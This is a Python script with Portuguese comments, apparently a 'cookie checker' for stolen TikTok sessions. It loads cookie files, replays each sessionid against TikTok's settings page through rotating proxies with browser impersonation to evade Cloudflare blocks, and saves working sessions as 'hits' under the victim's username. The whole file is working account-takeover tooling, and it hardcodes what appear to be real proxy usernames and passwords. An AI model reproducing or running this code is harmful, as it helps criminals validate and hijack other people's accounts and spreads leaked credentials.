import os
import re
import json
import time
import random
from concurrent.futures import ThreadPoolExecutor
from curl_cffi import requests

INPUT_DIR = "cookies"
OUT_DIR = "hits"
OUT_LOG = "tiktok_debug_log.json"

PROXIES = [
    "http://NNv4HNapZGtDaPqP:RmxNYMkqRVZpc2pG@geo.floppydata.com:10080",
    "http://tfnvjTUQNK7y4pmS:qKpMWhuYaxjBlgJU@geo.floppydata.com:10080",
    "http://hglICnb2bZsof6av:M9Gzb3OU7XDm9uKh@geo.floppydata.com:10080",
    "http://tQ8FGVcYWjk4lj0N:D7l7ImHEzFYC3T8F@geo.floppydata.com:10080",
    "http://customer-resi_29a67cc1-sessid-0634266845-sesstime-10:PvqsH~OC44j~@pr.oxylabs.io:7777",
    "http://flme02514c6-package-premium:6JQyXkG1NPK6PaX@proxy.flameproxies.com:8989",
    "http://rmbxqguc:0t07e51199ed@45.38.107.97:6014",
    "http://rmbxqguc:0t07e51199ed@64.137.96.74:6641",
    "http://rmbxqguc:0t07e51199ed@198.23.243.226:6361"
]

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def check_account(filepath):
    filename = os.path.basename(filepath)
    result_log = {"file": filename, "status": "ERROR", "details": "", "proxy_used": None}
    
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    except Exception as e:
        result_log["details"] = f"Erro ao ler arquivo: {e}"
        return False, "Erro Leitura", None, result_log

    cookies = {}
    # Pega apenas o formato Netscape (linhas com tabulação)
    for line in content.splitlines():
        parts = line.strip().split('\t')
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]

    if 'sessionid' not in cookies and 'sessionid_ss' not in cookies:
        result_log["details"] = "Cookie sessionid ausente"
        return False, "Sem sessionid", None, result_log

    proxy_url = get_random_proxy()
    proxy_dict = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    result_log["proxy_used"] = proxy_url.split('@')[-1] if proxy_url else "Sem Proxy"

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    try:
        r = requests.get(
            "https://www.tiktok.com/setting", 
            headers=headers, 
            cookies=cookies, 
            proxies=proxy_dict,
            impersonate="chrome124",
            timeout=25,
            allow_redirects=True
        )
        
        if "/login" in r.url or "login?redirect" in r.url:
            result_log["status"] = "DEAD"
            result_log["details"] = "Redirecionou pro Login"
            return False, "Dead", None, result_log
            
        if r.status_code == 200 and "/setting" in r.url:
            match = re.search(r'"uniqueId":"([^"]+)"', r.text)
            if match:
                username = match.group(1)
                result_log["status"] = "VIVO"
                result_log["details"] = f"Username: @{username}"
                
                # Retorna o username e o conteúdo cru para salvarmos no .txt
                return True, "VIVO", {"username": username, "content": content}, result_log
            else:
                result_log["status"] = "BLOCK"
                result_log["details"] = "Cloudflare (200 sem dados)"
                return False, "Block", None, result_log
            
        if r.status_code == 403:
            result_log["status"] = "BLOCK"
            result_log["details"] = "Cloudflare Block (403)"
            return False, "Block", None, result_log
            
        result_log["status"] = "HTTP_ERR"
        result_log["details"] = f"Status: {r.status_code}"
        return False, f"HTTP {r.status_code}", None, result_log

    except Exception as e:
        err_msg = str(e).split('\n')[0]
        result_log["status"] = "CONN_ERR"
        result_log["details"] = err_msg[:100]
        return False, "Erro Conexão", None, result_log

def main():
    if not os.path.exists(INPUT_DIR):
        os.makedirs(INPUT_DIR)
        print(f"[!] Pasta '{INPUT_DIR}' criada. Coloque os arquivos de cookie lá.")
        return
        
    if not os.path.exists(OUT_DIR):
        os.makedirs(OUT_DIR)

    files = [os.path.join(INPUT_DIR, f) for f in os.listdir(INPUT_DIR) if f.endswith('.txt') or f.endswith('.json')]
    if not files:
        print("[!] Nenhum arquivo encontrado na pasta cookies.")
        return

    print(f"[*] {len(files)} cookies encontrados.")
    print(f"[*] Proxies carregadas: {len(PROXIES)}")
    print(f"[*] Iniciando checagem...\n")

    def worker(filepath):
        success, info, data, log_data = check_account(filepath)
        
        if success:
            username = data['username']
            # Limpa o nome do arquivo para evitar caracteres inválidos
            safe_username = re.sub(r'[^a-zA-Z0-9_]', '_', username)
            out_filepath = os.path.join(OUT_DIR, f"@{safe_username}.txt")
            
            # Salva o arquivo TXT com o formato original
            with open(out_filepath, 'w', encoding='utf-8') as f:
                f.write(data['content'])
                
            print(f"\033[32m✅ VIVO\033[0m | @{username} -> Salvo em {out_filepath}")
        else:
            debug_text = f" | \033[33m{log_data['details']}\033[0m"
            print(f"\033[31m❌ {info:<15}\033[0m | {os.path.basename(filepath)}{debug_text}")
            
        # Salva o log geral de erros (append) em JSON
        try:
            existing_log = json.load(open(OUT_LOG, 'r', encoding='utf-8'))
        except:
            existing_log = []
        existing_log.append(log_data)
        json.dump(existing_log, open(OUT_LOG, 'w', encoding='utf-8'), indent=4, ensure_ascii=False)

        time.sleep(random.uniform(1.0, 2.0))
        return success, info, data, log_data

    with ThreadPoolExecutor(max_workers=2) as executor:
        list(executor.map(worker, files))

    print(f"\n[*] Checagem finalizada. Válidos salvos em '{OUT_DIR}/'.")

if __name__ == "__main__":
    main()
